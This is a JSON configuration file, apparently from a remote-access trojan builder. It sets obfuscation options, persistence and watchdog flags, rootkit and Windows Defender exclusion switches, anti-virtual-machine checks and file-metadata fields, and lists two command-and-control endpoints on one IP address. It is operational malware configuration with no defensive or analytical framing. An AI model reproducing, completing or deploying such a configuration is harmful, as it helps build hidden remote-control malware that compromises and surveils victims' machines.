{
  "ctrflow": false,
  "Rename": false,
  "Junk": false,
  "ProxyStr": false,
  "ProxyCall": false,
  "ProxyInt": false,
  "ManyProxy": false,
  "Mixcer": false,
  "ProtectInt": false,
  "Hosts": [
    "185.126.67.25:8888",
    "185.126.67.25:5555"
  ],
  "Group": "",
  "Mutex": "",
  "Install": false,
  "InstallWatchDog": false,
  "UseInstallAdmin": false,
  "ExclusionWD": false,
  "HiddenFile": false,
  "RootKit": false,
  "Pump": false,
  "UserInit": false,
  "TaskClient": "",
  "TaskWatchDog": "",
  "PathClientCmb": "%UserProfile%",
  "PathClientBox": "",
  "PathWatchDogCmb": "",
  "PathWatchDogBox": "",
  "CheckIcon": false,
  "CheckAssembly": false,
  "DigitalSignature": false,
  "AntiVirtual": false,
  "Icon": null,
  "Product": "",
  "Description": "",
  "Company": "",
  "Copyright": "",
  "Trademarks": "",
  "OriginalFilename": "",
  "ProductVersion": "",
  "FileVersion": ""
}